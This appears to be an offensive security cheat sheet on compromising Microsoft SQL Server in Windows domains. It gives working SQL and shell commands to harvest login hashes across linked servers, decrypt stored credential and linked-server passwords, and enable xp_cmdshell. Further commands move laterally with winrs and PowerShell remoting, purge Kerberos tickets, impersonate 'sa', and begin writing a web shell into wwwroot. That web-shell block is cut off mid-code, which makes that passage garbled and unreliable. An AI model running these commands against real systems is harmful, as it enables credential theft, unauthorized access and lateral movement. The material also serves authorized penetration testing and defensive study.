# MSSQL DB - T1433,2433,U1434

{% hint style="info" %}
* MSSQL Servers are commonly deployed across Windows domains.
* They offer strong lateral movement potential since domain users can be mapped to database roles.
{% endhint %}

### Default Configuration

* When an admin initially installs and configures MSSQL to be network accessible, the SQL service will likely run as `NT SERVICE\MSSQLSERVER` .

### Dangerous Settings

* MSSQL clients not using encryption to connect to the MSSQL server
* The use of self-signed certificates when encryption is being used. It is possible to spoof self-signed certificates
* The use of [named pipes](https://docs.microsoft.com/en-us/sql/tools/configuration-manager/named-pipes-properties?view=sql-server-ver15)
* Weak & default `sa` credentials. Admins may forget to disable this account

### Dedicated Administrator Connection (DAC)

* **Need:** SQL `sysadmin`; DAC is local-only by default and allows one session per instance. These commands target SQL Server instances, not Azure SQL Database.
* **Check the current setting and pending changes:** `RECONFIGURE` can apply other pending configuration changes too.
  * ```sql
    SELECT name, value, value_in_use
    FROM sys.configurations
    WHERE name = N'remote admin connections';

    SELECT name, value, value_in_use
    FROM sys.configurations
    WHERE value <> value_in_use;
    ```
* **Enable remote DAC when needed:** record the original setting first; no SQL Server restart is normally required.
  * ```sql
    EXEC sys.sp_configure N'remote admin connections', 1;
    RECONFIGURE;

    SELECT name, value, value_in_use
    FROM sys.configurations
    WHERE name = N'remote admin connections';
    ```
* **Host terminal:** Windows integrated authentication or a SQL sysadmin login. With `-U` and no `-P`, `sqlcmd` prompts for the password.
  * <pre class="language-bat" data-line-numbers><code class="lang-bat">sqlcmd -S "&#x3C;server\instance>" -A -E -d master
    sqlcmd -S "&#x3C;server\instance>" -A -U "&#x3C;sql-admin-login>" -d master
    </code></pre>
* **SSMS:** use a query-window connection, not Object Explorer; connect to `ADMIN:<server>` or `ADMIN:<server>\<instance>`. Disable IntelliSense for that connection to avoid consuming a second DAC session.
* **Connection failure:** DAC uses TCP 1434 or an instance-assigned TCP port, not SQL Browser's UDP 1434. Check the SQL error log and firewall; SQL Express normally requires startup trace flag `7806` for the listener.
* **Return to local-only DAC if the original value was `0`:**
  * ```sql
    EXEC sys.sp_configure N'remote admin connections', 0;
    RECONFIGURE;
    ```
* `GO` is an SSMS/sqlcmd batch separator, not T-SQL; omit it when submitting through a database driver. [Microsoft DAC reference](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/diagnostic-connection-for-database-administrators).

#### Batch Enumeration Across Linked Servers

* **Scope:** query every visible direct link for online databases and access, SQL-login password hashes, and servers registered on that remote instance. This discovers next-hop links; it does not recursively connect to them. Results use each link's mapped remote login, not necessarily the local login.
* **Requirements:** SQL Server targets, a working provider, and linked-server `DATA ACCESS`. `OPENQUERY` does not require `RPC OUT`, accepts no argument variables, and limits its inner query to 8 KB; the batch builds literal arguments with `QUOTENAME` and escaped single quotes. Provider/permission failures caught for one query do not stop the remaining queries.
* **Output modes:** set `@CollectResults = 1` for three combined, locally sorted result sets in session-local temporary tables; use `0` for separate result sets per server. Nothing is persisted to a permanent database. Submit the whole batch in one session without inserting `GO`.
  * ```sql
  SET NOCOUNT ON;

  DECLARE @CollectResults bit;
  SET @CollectResults = 1;

  IF OBJECT_ID('tempdb..#LinkedDbAccess') IS NOT NULL DROP TABLE #LinkedDbAccess;
  IF OBJECT_ID('tempdb..#LinkedLogins') IS NOT NULL DROP TABLE #LinkedLogins;
  IF OBJECT_ID('tempdb..#LinkedServers') IS NOT NULL DROP TABLE #LinkedServers;

  CREATE TABLE #LinkedDbAccess (
    LinkedServer sysname NOT NULL,
    DatabaseName sysname NOT NULL,
    HasAccess int NULL
  );
  CREATE TABLE #LinkedLogins (
    LinkedServer sysname NOT NULL,
    LoginName sysname NOT NULL,
    PasswordHash varbinary(256) NULL
  );
  CREATE TABLE #LinkedServers (
    LinkedServer sysname NOT NULL,
    ServerName sysname NULL,
    Product nvarchar(128) NULL,
    Provider nvarchar(128) NULL,
    DataSource nvarchar(4000) NULL,
    DataAccess bit NULL
  );

  DECLARE @ServerName sysname;
  DECLARE @Sql nvarchar(MAX);
  DECLARE @Inner nvarchar(MAX);

  DECLARE LinkedCursor CURSOR LOCAL FAST_FORWARD FOR
    SELECT name FROM sys.servers WHERE is_linked = 1 ORDER BY name;

  OPEN LinkedCursor;
  FETCH NEXT FROM LinkedCursor INTO @ServerName;

  WHILE @@FETCH_STATUS = 0
  BEGIN
    PRINT N'--- Linked server: ' + @ServerName + N' ---';

    SET @Inner = N'SELECT name AS DatabaseName, HAS_DBACCESS(name) AS HasAccess FROM sys.databases WHERE state = 0';
    SET @Sql = N'SELECT ' + QUOTENAME(@ServerName, '''') + N' AS LinkedServer, DatabaseName, HasAccess FROM OPENQUERY('
      + QUOTENAME(@ServerName) + N', ''' + REPLACE(@Inner, '''', '''''') + N''')';
    IF @CollectResults = 1
      SET @Sql = N'INSERT INTO #LinkedDbAccess (LinkedServer, DatabaseName, HasAccess) ' + @Sql;
    BEGIN TRY
      EXEC sys.sp_executesql @Sql;
    END TRY
    BEGIN CATCH
      PRINT N'Error (databases) on ' + @ServerName + N': ' + ERROR_MESSAGE();
    END CATCH;

    SET @Inner = N'SELECT name AS LoginName, password_hash AS PasswordHash FROM sys.sql_logins';
    SET @Sql = N'SELECT ' + QUOTENAME(@ServerName, '''') + N' AS LinkedServer, LoginName, PasswordHash FROM OPENQUERY('
      + QUOTENAME(@ServerName) + N', ''' + REPLACE(@Inner, '''', '''''') + N''')';
    IF @CollectResults = 1
      SET @Sql = N'INSERT INTO #LinkedLogins (LinkedServer, LoginName, PasswordHash) ' + @Sql;
    BEGIN TRY
      EXEC sys.sp_executesql @Sql;
    END TRY
    BEGIN CATCH
      PRINT N'Error (logins) on ' + @ServerName + N': ' + ERROR_MESSAGE();
    END CATCH;

    SET @Inner = N'SELECT name AS ServerName, product AS Product, provider AS Provider, data_source AS DataSource, is_data_access_enabled AS DataAccess FROM sys.servers';
    SET @Sql = N'SELECT ' + QUOTENAME(@ServerName, '''') + N' AS LinkedServer, ServerName, Product, Provider, DataSource, DataAccess FROM OPENQUERY('
      + QUOTENAME(@ServerName) + N', ''' + REPLACE(@Inner, '''', '''''') + N''')';
    IF @CollectResults = 1
      SET @Sql = N'INSERT INTO #LinkedServers (LinkedServer, ServerName, Product, Provider, DataSource, DataAccess) ' + @Sql;
    BEGIN TRY
      EXEC sys.sp_executesql @Sql;
    END TRY
    BEGIN CATCH
      PRINT N'Error (servers) on ' + @ServerName + N': ' + ERROR_MESSAGE();
    END CATCH;

    FETCH NEXT FROM LinkedCursor INTO @ServerName;
  END;

  CLOSE LinkedCursor;
  DEALLOCATE LinkedCursor;

  IF @CollectResults = 1
  BEGIN
    SELECT LinkedServer, DatabaseName, HasAccess
    FROM #LinkedDbAccess ORDER BY LinkedServer, DatabaseName;

    SELECT LinkedServer, LoginName, CONVERT(varchar(MAX), PasswordHash, 1) AS PasswordHashHex
    FROM #LinkedLogins ORDER BY LinkedServer, LoginName;

    SELECT LinkedServer, ServerName, Product, Provider, DataSource, DataAccess
    FROM #LinkedServers ORDER BY LinkedServer, ServerName;
  END;
  ```
* **Interpret database results:** `HasAccess = 1` means the mapped login can access that database, not that it can read every object; `0` means no access, including an occupied single-user database; `NULL` means an invalid database name. `state = 0` selects online databases only. Catalog visibility can hide databases, logins, and server registrations, so an empty result is not proof that none exist.
* **Hash permissions:** `sys.sql_logins` covers SQL-authentication logins, not Windows passwords or contained database users. Viewing `password_hash` requires `CONTROL SERVER` on older versions; SQL Server 2022+ requires `VIEW ANY CRYPTOGRAPHICALLY SECURED DEFINITION`. A missing/`NULL` hash is not an empty password. See [SQL Login Hashes](#sql-login-hashes) for hash handling.
* **Legacy server catalog:** to retain the supplied `master..sysservers` query, replace the server-inventory `SET @Inner` line with this alias-compatible form. It includes the remote local-server row as well as registered links, just like the unfiltered `sys.servers` query above.
  * ```sql
  SET @Inner = N'SELECT srvname AS ServerName, srvproduct AS Product, providername AS Provider, srvnetname AS DataSource, dataaccess AS DataAccess FROM master.dbo.sysservers';
  ```
* **Version variants:** the main batch uses SQL Server 2005+ syntax, including the pre-2016 `OBJECT_ID` existence checks. No separate post-2016 collector is needed. On SQL Server 2016+, the initial three checks can instead be written as:
  * ```sql
  DROP TABLE IF EXISTS #LinkedDbAccess;
  DROP TABLE IF EXISTS #LinkedLogins;
  DROP TABLE IF EXISTS #LinkedServers;
  ```
* **Inspect generated SQL:** insert this immediately before any `EXEC sys.sp_executesql @Sql` to display the generated command without `PRINT` truncation.
  * ```sql
  SELECT @ServerName AS LinkedServer, @Sql AS GeneratedSql;
  ```

### SQL Login Hashes

* **Need:** SQL permission to read password hashes: `CONTROL SERVER` on older versions; SQL Server 2022+ requires `VIEW ANY CRYPTOGRAPHICALLY SECURED DEFINITION`.
* ```sql
  -- Existing SQL session
  SELECT name, password_hash FROM sys.sql_logins;
  ```
* **NetExec direct SQL:** `-d` uses Windows domain authentication; for a SQL login, replace it with `--local-auth`.
  * ```bash
    nxc mssql '<sql-host>' -u '<username>' -p '<password>' -d '<domain>' -q "SELECT name,CONVERT(varchar(max),password_hash,1) AS password_hash FROM sys.sql_logins" --log sql-login-hashes.txt
    ```
* **Built-in collection variant:** check `nxc mssql --help` for `--db-hash` in the installed release.
  * ```bash
    nxc mssql '<sql-host>' -u '<username>' -p '<password>' -d '<domain>' --db-hash
    ```
* **Through SMB command execution:** requires `sqlcmd` on the target. `-S` selects the instance; `-E` uses the remote process's Windows identity, which still needs SQL permissions.
  * ```bash
    nxc smb '<target-ip>' -u '<local-admin>' -p '<password>' --local-auth -x 'sqlcmd -S "<server\instance>" -E -Q "SELECT name,CONVERT(varchar(max),password_hash,1) AS password_hash FROM sys.sql_logins"' --log sql-login-hashes-via-smb.txt
    ```
* This returns SQL-authentication login hashes, not database contents or Windows password hashes. Null/limited output can reflect permissions. [SQL catalog reference](https://learn.microsoft.com/en-us/sql/relational-databases/system-catalog-views/sys-sql-logins-transact-sql).

### Stored Credential Passwords

* **Legacy internals via** [**DAC**](mssql-db-t1433-2433-u1434.md#dedicated-administrator-connection-dac)**:** NetSPI identified credential ciphertext at `valclass=28`, `valnum=2`, in `imageval`. Verify the layout against the assessed SQL version.
* Use the credential name from `sys.credentials`; the query returns encrypted bytes, not plaintext passwords.
* ```sql
  USE master;
  SELECT credential.credential_id, credential.name,
         credential.credential_identity, stored.imageval AS encrypted_secret
  FROM sys.credentials AS credential
  JOIN sys.sysobjvalues AS stored ON stored.objid = credential.credential_id
  WHERE stored.valclass = 28
    AND stored.valnum = 2
    AND credential.name = N'<credential-name>';
  ```
* **Internal target-type labels:** optional view-definition inspection, not credential extraction.
  * ```sql
    SELECT * FROM master.sys.syspalvalues WHERE class = 'SRCL';
    ```
* **Decrypt with NetSPI's module:** run locally on the SQL Windows host in elevated Windows PowerShell, with SQL sysadmin access and a free DAC slot. The module needs the machine's DPAPI material and instance registry entropy; ciphertext alone is insufficient.
  * <pre class="language-powershell" data-line-numbers><code class="lang-powershell">Import-Module .\Get-MSSQLCredentialPasswords.psm1
    Get-MSSQLCredentialPasswords
    </code></pre>
* Source: [module](https://github.com/NetSPI/Powershell-Modules/blob/master/Get-MSSQLCredentialPasswords.psm1), [storage and decryption](https://www.netspi.com/blog/technical/adversary-simulation/decrypting-mssql-credential-passwords/).

### Execute Commands <sup><sub>(xp\_cmdshell)</sub></sup> <a href="#execute-commands" id="execute-commands"></a>

* ```sql
  -- Enable xp_cmdshell
  EXECUTE sp_configure 'show advanced options', 1
  RECONFIGURE
  EXECUTE sp_configure 'xp_cmdshell', 1
  RECONFIGURE
  ```
* **OS identity and connectivity, SQL query window:** sysadmin execution uses the SQL service account; non-sysadmin execution uses the configured xp_cmdshell proxy.
  * ```sql
    EXEC master.dbo.xp_cmdshell 'whoami';
    EXEC master.dbo.xp_cmdshell 'whoami /groups';
    EXEC master.dbo.xp_cmdshell 'ping -n 1 <target-fqdn>';
    EXEC master.dbo.xp_cmdshell 'dir \\<target-fqdn>\ADMIN$';
    EXEC master.dbo.xp_cmdshell 'dir \\<target-fqdn>\C$';
    EXEC master.dbo.xp_cmdshell 'powershell.exe -NoProfile -Command "Get-ChildItem -LiteralPath ''\\<target-fqdn>\<share>'' -ErrorAction Stop"';
    ```
* `xp_cmdshell` accepts at most one pair of double quotes in its command string; double embedded single quotes at the T-SQL layer. Ping reachability does not establish access to a service.

#### Remote SQL Queries

* **Need:** `sqlcmd` installed on the originating SQL Windows host, a reachable target instance, and SQL permissions for the executing Windows identity. `-E` uses that identity; local Windows administrator access is not SQL sysadmin access.
  * ```sql
    EXEC master.dbo.xp_cmdshell 'sqlcmd -S <target-fqdn> -E -Q "SELECT * FROM sys.fn_my_permissions(NULL, ''SERVER'');"';
    EXEC master.dbo.xp_cmdshell 'sqlcmd -S <target-fqdn> -E -Q "SELECT name, database_id, create_date FROM sys.databases;"';
    EXEC master.dbo.xp_cmdshell 'sqlcmd -S <target-fqdn> -E -d <database> -Q "SELECT TABLE_CATALOG,TABLE_SCHEMA,TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE=''BASE TABLE'';"';
    EXEC master.dbo.xp_cmdshell 'sqlcmd -S <target-fqdn> -E -Q "SELECT TABLE_SCHEMA,TABLE_NAME FROM [<database>].INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE=''BASE TABLE'';"';
    EXEC master.dbo.xp_cmdshell 'sqlcmd -S <target-fqdn> -E -Q "SELECT name,type_desc,is_disabled FROM master.sys.server_principals WHERE IS_SRVROLEMEMBER(''sysadmin'',name)=1 ORDER BY name;"';
    EXEC master.dbo.xp_cmdshell 'sqlcmd -S <target-fqdn> -E -Q "SELECT name,CONVERT(varchar(max),password_hash,1) AS password_hash FROM sys.sql_logins;"';
    ```
* Set `-S` to `<server>\<instance>` or `tcp:<server>,<port>` when needed. Hash visibility follows the permissions in [SQL Login Hashes](#sql-login-hashes).

#### Remote Windows Commands

* **WinRS uses WinRM/WS-Man, not MSRPC:** target WinRM listener, permitted remote-shell access, and usable credentials from the xp_cmdshell context.
  * ```sql
    EXEC master.dbo.xp_cmdshell 'winrs.exe /r:<target-fqdn> ipconfig';
    EXEC master.dbo.xp_cmdshell 'winrs.exe /r:<target-fqdn> whoami /groups';
    EXEC master.dbo.xp_cmdshell 'winrs.exe /r:<target-fqdn> net localgroup Administrators';
    EXEC master.dbo.xp_cmdshell 'winrs.exe /r:<target-fqdn> cmd.exe /c dir D:\';
    EXEC master.dbo.xp_cmdshell 'winrs.exe /noprofile /r:<target-fqdn> whoami';
    ```
* **PowerShell remoting equivalent:**
  * ```sql
    EXEC master.dbo.xp_cmdshell 'powershell.exe -NoProfile -Command "Invoke-Command -ComputerName ''<target-fqdn>'' -ScriptBlock { Get-ChildItem C:\ }"';
    ```
* **RPC/WMI service, task, and BIOS queries:** SCM/task/WMI permissions and the corresponding remote endpoints are separate from WinRM access. `wmic.exe` must be installed for its legacy variant.
  * ```sql
    EXEC master.dbo.xp_cmdshell 'sc.exe \\<target-fqdn> query';
    EXEC master.dbo.xp_cmdshell 'schtasks.exe /query /s <target-fqdn>';
    EXEC master.dbo.xp_cmdshell 'rpcping.exe /s <target-fqdn> /t ncacn_ip_tcp /e 135';
    EXEC master.dbo.xp_cmdshell 'wmic.exe /node:<target-fqdn> bios get description';
    ```
* **CIM over DCOM equivalent:**
  * ```sql
    EXEC master.dbo.xp_cmdshell 'powershell.exe -NoProfile -Command "$option = New-CimSessionOption -Protocol Dcom; $session = New-CimSession -ComputerName ''<target-fqdn>'' -SessionOption $option; Get-CimInstance -CimSession $session -ClassName Win32_BIOS | Select-Object Description; Remove-CimSession $session"';
    ```

#### Multi-Hop Execution

* **SQL host > first host > second host:** the first host must have credentials/delegation usable for the second connection. A successful first hop does not establish second-hop authentication.
  * ```sql
    EXEC master.dbo.xp_cmdshell 'winrs.exe /r:<first-hop-fqdn> winrs.exe /r:<second-hop-fqdn> whoami';
    EXEC master.dbo.xp_cmdshell 'winrs.exe /r:<first-hop-fqdn> schtasks.exe /query /s <second-hop-fqdn>';
    EXEC master.dbo.xp_cmdshell 'winrs.exe /r:<first-hop-fqdn> sc.exe \\<second-hop-fqdn> query';
    EXEC master.dbo.xp_cmdshell 'winrs.exe /r:<first-hop-fqdn> wmic.exe /node:<second-hop-fqdn> bios get description';
    EXEC master.dbo.xp_cmdshell 'winrs.exe /r:<first-hop-fqdn> cmd.exe /c dir \\<second-hop-fqdn>\ADMIN$';
    EXEC master.dbo.xp_cmdshell 'powershell.exe -NoProfile -Command "Invoke-Command -ComputerName ''<first-hop-fqdn>'' -ScriptBlock { Invoke-Command -ComputerName ''<second-hop-fqdn>'' -ScriptBlock { Get-ChildItem C:\ } }"';
    ```

#### Kerberos Sessions and Ticket Cache

* **Local and remote cache inspection:** listing other logon sessions/caches requires the applicable Windows privileges. Use the actual LUID from the session list.
  * ```sql
    EXEC master.dbo.xp_cmdshell 'klist.exe';
    EXEC master.dbo.xp_cmdshell 'klist.exe sessions';
    EXEC master.dbo.xp_cmdshell 'klist.exe sessions | findstr /i <service-account-fragment>';
    EXEC master.dbo.xp_cmdshell 'klist.exe -li 0x<logon-id> tickets';
    EXEC master.dbo.xp_cmdshell 'winrs.exe /noprofile /r:<target-fqdn> klist.exe sessions';
    EXEC master.dbo.xp_cmdshell 'winrs.exe /noprofile /r:<target-fqdn> klist.exe -li 0x<logon-id> tickets';
    ```
* **Force reauthentication by deleting cached tickets:** without `-li`, purge applies to the command's current logon session; the other variants select a session on the local or remote host.
  * ```sql
    EXEC master.dbo.xp_cmdshell 'klist.exe purge';
    EXEC master.dbo.xp_cmdshell 'klist.exe -li 0x<logon-id> purge';
    EXEC master.dbo.xp_cmdshell 'winrs.exe /noprofile /r:<target-fqdn> klist.exe -li 0x<logon-id> purge';
    ```

#### OLE Automation File Write

* ```sql
  -- Enable Ole Automation Procedures
  sp_configure 'show advanced options', 1
  RECONFIGURE
  sp_configure 'Ole Automation Procedures', 1
  RECONFIGURE
  -- Create a File
  DECLARE @OLE INT
  DECLARE @FileID INT
  EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
  EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1

### Impersonate Existing Users <a href="#impersonate-existing-users-with-mssql" id="impersonate-existing-users-with-mssql"></a>

* Allows the executing user to take on the permissions of another user or login until the context is reset or the session ends.
* <pre class="language-sql" data-line-numbers><code class="lang-sql">-- Identify Users that We Can Impersonate
  SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
  GO
  -- Verifying our Current User and Role
  SELECT SYSTEM_USER
  SELECT IS_SRVROLEMEMBER('sysadmin')
  GO
  -- Impersonating another User
  -- It's recommended to run EXECUTE AS LOGIN within the master DB, because all users, by default, have access to that database
  EXECUTE AS LOGIN = 'sa'
  SELECT SYSTEM_USER
  SELECT IS_SRVROLEMEMBER('sysadmin')
  GO
  </code></pre>

#### Stored Linked-Server Passwords

* **Inspect login mappings:** these describe which identity is selected; they do not reveal its password.
  * ```sql
    SELECT name, provider, data_source FROM sys.servers WHERE is_linked = 1;
    EXEC sys.sp_helplinkedsrvlogin @rmtsrvname = N'<linked-server>';
    ```
* **NetSPI decryption:** same local Windows administrator, SQL sysadmin, DPAPI, and DAC prerequisites as [stored credential passwords](mssql-db-t1433-2433-u1434.md#stored-credential-passwords).
  * <pre class="language-ps1" data-line-numbers><code class="lang-ps1">Import-Module .\Get-MSSQLLinkPasswords.psm1
    Get-MSSQLLinkPasswords
    </code></pre>
* This module reads encrypted linked-login secrets from the internal `master.sys.syslnklgns.pwdhash` column; despite its name, this is ciphertext, not a crackable login hash. Integrated mappings need not contain a stored password.
* [Module](https://github.com/NetSPI/Powershell-Modules/blob/master/Get-MSSQLLinkPasswords.psm1), [research](https://www.netspi.com/blog/technical/adversary-simulation/decrypting-mssql-database-link-server-passwords/).

#### ADSI / LDAP Authentication Variant

* **Need:** an existing ADSI-provider linked server usable by the current login, a reachable test LDAP endpoint, and an LDAP listener that records bind requests.
* Substitute the actual link name; the LDAP URL in the query can select a destination different from the link's configured data source.
* ```sql
  SELECT * FROM OPENQUERY([<ADSI-linked-server>], 'SELECT * FROM ''LDAP://<test-ldap-host>''');
  ```
* Inspect the bind type: the published cases used simple bind with mapped credentials, GSSAPI for a Windows-authenticated self-mapping, or attempted simple bind with the current SQL login in another configuration. TLS, mappings, and provider behavior affect what is observable.
* This is outbound authentication, not SMK decryption; sysadmin/local administrator access is not inherently required when a usable link already exists. [Tarlogic ADSI workflow](https://www.tarlogic.com/blog/linked-servers-adsi-passwords/).
